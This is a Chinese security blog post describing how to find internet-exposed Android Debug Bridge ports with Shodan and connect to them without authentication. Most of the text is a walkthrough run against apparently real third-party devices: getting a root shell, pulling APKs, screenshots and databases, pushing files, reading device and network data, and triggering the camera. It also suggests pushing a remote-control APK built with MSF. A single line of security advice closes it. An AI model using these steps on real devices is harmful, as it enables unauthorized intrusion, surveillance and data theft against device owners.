**本文未经作者同意不得转载。同时，本文所涉及内容均为科普性质，任何个人或组织不得利用本文内容牟利或实施违法行为。**  

## 一、前言

 **Android调试桥 (adb) 是一种命令行工具，可与安卓设备进行通信。**

adb 命令便于执行各种设备操作（例如安装和调试应用），并提供对 Unix shell（可用来在设备上运行各种命令）的访问权限。它是一种客户端-服务器程序，包括以下三个组件：

> 客户端：用于发送命令。客户端在开发计算机上运行。可以通过发出 adb 命令从命令行终端调用客户端。
>
> 守护进程 (adbd)：在设备上运行命令。守护进程在每个设备上作为后台进程运行。
>
> 服务器：管理客户端和守护进程之间的通信。服务器在开发计算机上作为后台进程运行。

## 二、背景

学习APP逆向过程中，经常会用到ADB进行调试，在自行搭建的环境中，IP地址都是本地地址127.0.0.1。那么有没有可能，有一些心比较大的开发测试人员，把ADB调试环境放到公网上？有了想法就要行动起来，借助shodan搜索特征："Android
Debug Bridge""Device" port:5555 ## 5555-5585之间的奇数端口是模拟器端口

![](https://image.3001.net/images/20200109/1578554361_5e16d3f9a7e29.png!small)

图1 shodan搜索结果

如图1所见，全球大约有8701个搜索结果。这就为下一步连接ADB提供了基础，尝试使用ADB工具连接一个目的IP。

## 三、连接ADB

手里用于安卓测试的环境还是比较完整的，这里直接利用雷电模拟器自带的ADB工具就可以了：

![](https://image.3001.net/images/20200109/1578554372_5e16d4048e0bc.png!small)

图2 ADB连接

如图2，任意挑选了一个IP，连接成功，获得ADB SHELL，没有任何授权认证。

![](https://image.3001.net/images/20200109/1578554382_5e16d40e0d0c7.png!small)

图3 SHELL命令执行

好奇心使然，看看测试机中装了什么APP，结果如上图所示。到了这一步，那么ADB PULL和ADB PUSH也是毫无问题了（下载上传文件）。

假设利用MSF生成了一个恶意远控APK，利用这个漏洞PUSH
恶意APK到测试机上，还能进一步执行机体其他功能。如果想象力足够丰富，也可以联想到，实体机也是可以连接ADB的，能干的事就更多了……….

## 四、其他命令

以下是作者通过实践，可以运行的命令-------
### 一、选择指定的IP连接shell

D:\ADB>adb -s112.118.*.*:5555 shell

******box:/ $

可以执行linux命令

### 二、ADB超级用户权限

D:\ADB>adb shell

******box:/ $ cd system/bin

*****box:/system/bin $ su

******box:/system/bin #

提示符$变为#，已经取得su权限

### 三、列举全部安装的包名

D:\ADB>adb shell pm listpackage ## 加-3参数只列举第三方应用，-s列举系统应用

回显：

> package:com.android.cts.priv.ctsshim
>
> package:com.google.android.ext.services
>
> package:com.vipstore
>
> package:hdpfans.com
>
> package:com.google.android.launcher.layouts.gms
>
> package:com.yijianjiasu
>
> package:com.yhb.bosstv
>
> package:com.android.bluetooth
>
> package:com.android.providers.contacts
>
> package:com.android.captiveportallogin
>
> package:cmf0.c3b5b**0zq.patch

### 四、列举指定包所在的APK路径

D:\ADB>adb shell pm pathcom.ufo.miner

回显：

> package:/data/app/com.ufo.miner-1/base.apk

### 五、下载指定的APK文件

D:\ADB>adb pull/system/app/BossTV_Launcher/BossTV_release_v1.0_20180809.apk
D:\\\adb ###注意本地路径是D:\\\而不是D:\

回显：

> [22%] /system/app/BossTV_Launcher/BossTV_release_v1.0_20180809.apk

### 六、截屏

D:\ADB>adb shell/system/bin/screencap -p /sdcard/screenshot.png

> 无回显

### 七、下载截屏文件

D:\ADB>adb pull/sdcard/screenshot.png D:\\\ADB

回显：

> /sdcard/screenshot.png: 1 filepulled. 0.0 MB/s (5323 bytes in 1.642s)

### 八、上传文件

D:\ADB>adb push su /sdcard

回显：

> su: 1 file pushed. 0.5 MB/s(109252 bytes in 0.196s)

某些模拟器或真机没有su文件，无法以su权限执行命令，可以将su 上传至/system/bin路径后执行

### 九、获取当前运行的APK

D:\ADB>adb shell dumpsysactivity top

TASK com.iptv.ubtvl id=8

ACTIVITYcom.iptv.ubtvl/com.gemini.play.LivePlayerActivity 41beb050 pid=21949

Local Activity 418ca9b0 State:

mResumed=true mStopped=falsemFinished=false

mLoadersStarted=true

mChangingConfigurations=false

### 十、备份指定文件

D:\ADB>adb backup -nosystem-all -noapk -noshared -f
app.ab/data/app/com.elinkway.tvlive2-2/base.apk

回显

> Now unlock your device andconfirm the backup
> operation...##需目标机上进行确认，常规方法是不能确认的，可以尝试ADB远程按键布局方式确认。

参数说明

> [-system | -nosystem] 是否备份系统
>
> [-apk | -noapk] 是否备份apk安装文件
>
> [-shared | -noshared] 是否备份手机存储空间
>
> -f *.ab 存档格式一定要是.ab

### 十一、分析备份文件

工具下载（abe）

<https://download.csdn.net/download/jiangwei0910410003/9523470>

打CTF的应该知道，APP逆向一环经常会在ab文件中隐藏flag线索。Ab文件可以加密也可以不加密，关键看文件头前24字节，如果有none，就是未加密。

### 十二、备份文件的恢复

D:\ADB>adb restore app*.ab

> 无回显

### 十三、查找全部数据库（以su权限登入）

*******_box:/ # find -name "*.db"

回显：

> ./storage/emulated/0/Android/data/com.*******.android/cache/firekylin/res.db
>
> ./data/user_de/0/com.google.android.gms/databases/rmq.db
>
> ./data/user_de/0/com.android.bluetooth/databases/btopp.db
>
> ./data/user_de/0/com.android.providers.contacts/databases/calllog_shadow.db
>
> ./data/media/0/Android/data/com.molitv.android/cache/firekylin/res.db

### 十四、查看指定数据库

*******x:/data/media/0/Android/data/com.molitv.android/cache# sqlite3 res.db

回显：

> SQLite version 3.9.2 2015-11-0218:31:45
>
> Enter ".help" forusage hints. ##输入.help查看帮助

### 十五、数据库操作命令

*******box:/data/data/com.*********.**live2/databases# sqlite3 MessageStore.db

回显：

> SQLite version 3.9.22015-11-02 18:31:45
>
> Enter ".help" forusage hints.
>
> sqlite> .tables ##列表名
>
> MessageStore MsgAlias MsgTemp android_metadata
>
> sqlite> select * fromMessageStore; ##查询表，以分号结束
>
> sqlite> select * fromMsgAlias;
>
> sqlite> select * from android_metadata;
>
> zh_TW

### 十六、查看设备硬件信息

D:\ADB>adb shell getpropro.product.model

回显：

> ****TV-V2

### 十七、查看电池情况

D:\ADB>adb shell dumpsysbattery

回显：

> Current Battery Service state:
>
> AC powered: true
>
> USB powered: false
>
> Wireless powered: false
>
> Max charging current: 0
>
> Max charging voltage: 0
>
> Charge counter: 0
>
> status: 2
>
> health: 2
>
> present: true
>
> level: 100
>
> scale: 100
>
> voltage: 0
>
> temperature: 424
>
> technology:

十八、查看分辨率

D:\ADB>adb shell wm size

回显

> Physical size: 1280x720

### 十九、看安卓版本

D:\ADB>adb shell getpropro.build.version.release

回显：

> 7.1.2

### 二十、查看IP地址信息

D:\ADB>adb shell ifconfig

回显：

> eth0 Link encap:Ethernet HWaddr e0:76:d0:bc:3d:d3
>
> inet addr:2**.*.*.3 Bcast:2**.*.*.255 Mask:255.255.248.0
>
> inet6 addr:fe80::e276:d0ff:febc:3dd3/64 Scope: Link
>
> UP BROADCAST RUNNING MULTICAST MTU:1500Metric:1
>
> RX packets:1214032 errors:0 dropped:0overruns:0 frame:0
>
> TX packets:298032868 errors:0dropped:0 overruns:0 carrier:0
>
> collisions:0 txqueuelen:1000
>
> RX bytes:659968644 TXbytes:37888841953
>
> Interrupt:53
>
> wlan0 Link encap:Ethernet HWaddr cc:4b:73:6c:22:ba
>
> UP BROADCAST MULTICAST MTU:1500Metric:1
>
> RX packets:0 errors:0 dropped:0overruns:0 frame:0
>
> TX packets:0 errors:0 dropped:0overruns:0 carrier:0
>
> collisions:0 txqueuelen:1000
>
> RX bytes:0 TX bytes:0
>
> lo Link encap:Local Loopback
>
> inet addr:127.0.0.1 Mask:255.0.0.0
>
> inet6 addr: ::1/128 Scope: Host
>
> UP LOOPBACK RUNNING MTU:65536Metric:1
>
> RX packets:36626 errors:0 dropped:0overruns:0 frame:0
>
> TX packets:36626 errors:0 dropped:0overruns:0 carrier:0
>
> collisions:0 txqueuelen:0
>
> RX bytes:520534484 TX bytes:520534484

### 二十一、查看CPU信息

D:\ADB>adb shell cat/proc/cpuinfo

回显：

> processor : 0
>
> BogoMIPS : 48.00
>
> Features : fp asimd evtstrm aes pmull sha1 sha2crc32
>
> CPU implementer : 0x41
>
> CPU architecture: AArch64
>
> CPU variant : 0x0
>
> CPU part : 0xd03
>
> CPU revision : 4
>
> processor : 1
>
> BogoMIPS : 48.00
>
> Features : fp asimd evtstrm aes pmull sha1 sha2crc32
>
> CPU implementer : 0x41
>
> CPU architecture: AArch64
>
> CPU variant : 0x0
>
> CPU part : 0xd03
>
> CPU revision : 4
>
> processor : 2
>
> BogoMIPS : 48.00
>
> Features : fp asimd evtstrm aes pmull sha1 sha2crc32
>
> CPU implementer : 0x41
>
> CPU architecture: AArch64
>
> CPU variant : 0x0
>
> CPU part : 0xd03
>
> CPU revision : 4
>
> processor : 3
>
> BogoMIPS : 48.00
>
> Features : fp asimd evtstrm aes pmull sha1 sha2crc32
>
> CPU implementer : 0x41
>
> CPU architecture: AArch64
>
> CPU variant : 0x0
>
> CPU part : 0xd03
>
> CPU revision : 4
>
> Hardware : rockchip,rk3328
>
> Revision : 0000
>
> Serial : 573a2d2d9b04a223

### 二十二、查看内存信息

D:\ADB>adb shell cat/proc/meminfo

回显：

> MemTotal: 1967120 kB
>
> MemFree: 48232 kB
>
> Buffers: 21952 kB
>
> Cached: 354728 kB
>
> SwapCached: 4584 kB
>
> Active: 292684 kB
>
> Inactive: 354772 kB
>
> Active(anon): 174692 kB
>
> Inactive(anon): 212576 kB
>
> Active(file): 117992 kB
>
> Inactive(file): 142196 kB
>
> Unevictable: 115908 kB
>
> Mlocked: 111572 kB
>
> SwapTotal: 520908 kB
>
> SwapFree: 474296 kB
>
> Dirty: 0 kB
>
> Writeback: 0 kB
>
> AnonPages: 383900 kB
>
> Mapped: 174248 kB
>
> Shmem: 840 kB
>
> Slab: 61068 kB
>
> SReclaimable: 24612 kB
>
> SUnreclaim: 36456 kB
>
> KernelStack: 11200 kB
>
> PageTables: 16552 kB
>
> NFS_Unstable: 0 kB
>
> Bounce: 0 kB
>
> WritebackTmp: 0 kB
>
> CommitLimit: 1012688 kB
>
> Committed_AS: 32276384 kB
>
> VmallocTotal: 251658176 kB
>
> VmallocUsed: 100360 kB
>
> VmallocChunk: 251461376 kB

### 二十三、更多的硬件信息

D:\ADB>adb shell cat/system/build.prop

回显：

> # begin build properties
>
> # autogenerated bybuildinfo.sh
>
> ro.build.id=NHG47K
>
> ro.build.display.id=rk3328_box-userdebug7.1.2 NHG47K
> eng.server.20180808.171616 test-keys
>
> ro.build.version.incremental=eng.server.20180808.171616
>
> ro.build.version.sdk=25
>
> ro.build.version.preview_sdk=0
>
> ro.build.version.codename=REL
>
> ro.build.version.all_codenames=REL
>
> ro.build.version.release=7.1.2
>
> ro.build.version.security_patch=2017-04-05
>
> ro.build.version.base_os=
>
> ro.build.date=2018骞?08鏈?08鏃?鏄熸湡涓?17:16:16CST
>
> ro.build.date.utc=1533719776
>
> ro.build.type=userdebug
>
> ro.build.user=server
>
> ro.build.host=server
>
> ro.build.tags=test-keys
>
> ro.build.flavor=rk3328_box-userdebug
>
> ro.product.model=BOSSTV-V2
>
> ro.product.brand=BOSSTV
>
> ro.product.name=rk3328_box
>
> ro.product.device=rk3328_box
>
> ro.product.board=rk30sdk
>
> # ro.product.cpu.abi andro.product.cpu.abi2 are obsolete,
>
> # use ro.product.cpu.abilistinstead.
>
> ro.product.cpu.abi=arm64-v8a
>
> ro.product.cpu.abilist=arm64-v8a,armeabi-v7a,armeabi
>
> ro.product.cpu.abilist32=armeabi-v7a,armeabi
>
> ro.product.cpu.abilist64=arm64-v8a
>
> ro.product.manufacturer=rockchip
>
> ro.wifi.channels=
>
> ro.board.platform=rk3328
>
> # ro.build.product isobsolete; use ro.product.device
>
> ro.build.product=rk3328_box
>
> # Do not try to parsedescription, fingerprint, or thumbprint
>
> ro.build.description=rk3328_box-userdebug7.1.2 NHG47K
> eng.server.20180808.171616 test-keys
>
>
> ro.build.fingerprint=rockchip/rk3328_box/rk3328_box:7.1.2/NHG47K/server08081716:userdebug/test-> keys
>
> ro.build.characteristics=box
>
> # end build properties
>
> #
>
> # fromdevice/rockchip/rk3328/rk3328_box/system.prop
>
> #
>
> #
>
> # system.prop
>
> #
>
> #rild.libpath=/system/lib/libreference-ril.so
>
> #rild.libargs=-d /dev/ttyUSB2
>
> # Default ecclist
>
> ro.ril.ecclist=112,911
>
> ro.opengles.version = 196609
>
> wifi.interface=wlan0
>
> rild.libpath=/system/lib/libril-rk29-dataonly.so
>
> rild.libargs=-d /dev/ttyACM0
>
> persist.tegra.nvmmlite = 1
>
> persist.sys.boot.check=false
>
> ro.audio.monitorOrientation=true
>
> #NFC
>
> debug.nfc.fw_download=false
>
> debug.nfc.se=false
>
> #add Rockchip properties here
>
> ro.rk.screenoff_time=2147483647
>
> ro.rk.screenshot_enable=true
>
> ro.rk.def_brightness=200
>
>
> ro.rk.homepage_base=<http://www.google.com/webhp?client=>{CID}&ampampsource=android-> home
>
> ro.rk.install_non_market_apps=false
>
> sys.hwc.compose_policy=6
>
> sys.wallpaper.rgb565=0
>
> sf.power.control=8847360
>
> sys.rkadb.root=0
>
> ro.sf.fakerotation=false
>
> ro.sf.hwrotation=0
>
> ro.rk.MassStorage=false
>
> ro.rk.systembar.voiceicon=true
>
> ro.rk.systembar.tabletUI=false
>
> ro.rk.LowBatteryBrightness=true
>
> ro.tether.denied=false
>
> sys.resolution.changed=false
>
> ro.default.size=100
>
> persist.sys.timezone=Asia/Hong_Kong
>
> ro.product.usbfactory=rockchip_usb
>
> ro.support.lossless.bitstream=true
>
> wifi.supplicant_scan_interval=15
>
> ro.factory.tool=0
>
> #set default lcd density forrk3328 box product
>
> ro.sf.lcd_density=160
>
> ro.sw.defaultlauncherpackage=
>
> ro.sw.defaultlauncherclass=
>
> persist.sys.firstapppackage=
>
> persist.sys.firstappclass=
>
> persist.sys.firstappdelyms=
>
> persist.sys.bootvideo.enable=true
>
> persist.sys.bootvideo.showtime=20
>
> ro.sw.default_timeformat=24
>
> service.adb.tcp.port=5555
>
> ro.adb.secure =0
>
> sys.hwc.enable=1
>
> #set wifi contry code
>
> ro.boot.wificountrycode=CN
>
> #set for video optimize
>
> sys.video.netBuffer=20
>
> #sys.video.refFrameMode=1
>
> #
>
> # ADDITIONAL_BUILD_PROPERTIES
>
> #
>
> wifi.interface=wlan0
>
> ro.opengles.version=196609
>
> dalvik.vm.heapstartsize=16m
>
> dalvik.vm.heapgrowthlimit=192m
>
> dalvik.vm.heapsize=512m
>
> dalvik.vm.heaptargetutilization=0.75
>
> dalvik.vm.heapminfree=512k
>
> dalvik.vm.heapmaxfree=8m
>
> ro.product.locale=zh-TW
>
> ro.product.locale.region=TW
>
> ro.product.locale.language=zh
>
> ro.sw.longpower_no_confirm=true
>
> ro.sw.shortpower_shutdown=true
>
> ro.sw.wakeupreboot=true
>
> persist.sys.usb0device=0
>
> persist.sys.bootnum=1
>
> key.shortcuts.red=app://com.yhb.bosstv/.FavoriteActivity
>
> key.shortcuts.blue=app://com.viplive
>
> ro.rksdk.version=RK30_ANDROID7.1.2-SDK-v1.00.00
>
> camera2.portability.force_api=1
>
> persist.sys.strictmode.visual=false
>
> ro.rk.bt_enable=true
>
> ro.rk.flash_enable=true
>
> ro.rk.hdmi_enable=true
>
> ro.factory.hasUMS=false
>
> persist.sys.usb.config=mtp,adb
>
> testing.mediascanner.skiplist=/mnt/shell/emulated/Android/
>
> ro.factory.hasGPS=false
>
> ro.factory.storage_supp

### 二十四、ADB调用摄像头

D:\ADB>adb shell am start-a android.media.action.STILL_IMAGE_CAMERA

回显：

> Starting: Intent {act=android.media.action.STILL_IMAGE_CAMERA }##启动camera

D:\ADB>adb shell inputkeyevent 27 ##camera 键

> 无回显

D:\ADB>adb shell inputkeyevent 4 ## back 键

> 无回显

## 五、安全建议

需知，ADB没有任何权限认证手段，不应将ADB端口开放至公网环境，调试完毕即kill ADB进程，关闭ADB服务端。

 ***本文原创作者：吞龙，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

